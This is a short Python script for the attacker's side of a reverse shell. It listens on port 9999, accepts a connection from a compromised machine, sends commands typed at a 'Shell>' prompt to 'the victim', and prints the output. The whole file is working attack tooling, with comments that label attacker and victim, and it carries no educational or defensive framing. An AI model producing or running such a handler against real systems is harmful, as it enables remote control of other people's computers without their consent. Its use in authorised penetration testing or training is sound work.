import socket
# Set up the listener for the reverse shell connection
attacker_ip = "0.0.0.0"  # Listen on all available interfaces
attacker_port = 9999  # Port to listen on
# Create a socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((attacker_ip, attacker_port))
server_socket.listen(5)  # Allow up to 5 simultaneous connections
print(f"Listening on {attacker_ip}:{attacker_port} for incoming connections...")
# Accept incoming connections
client_socket, client_address = server_socket.accept()
print(f"Connection established from {client_address}")
# Set up an interactive shell
while True:
    # Display a prompt
    command = input("Shell> ")
    # Send command to the victim
    client_socket.send(command.encode())
    # Receive and display the output
    response = client_socket.recv(1024).decode()
    print(response)
    # If the user types "exit", close the connection
    if command.lower() == "exit":
        client_socket.close()
        break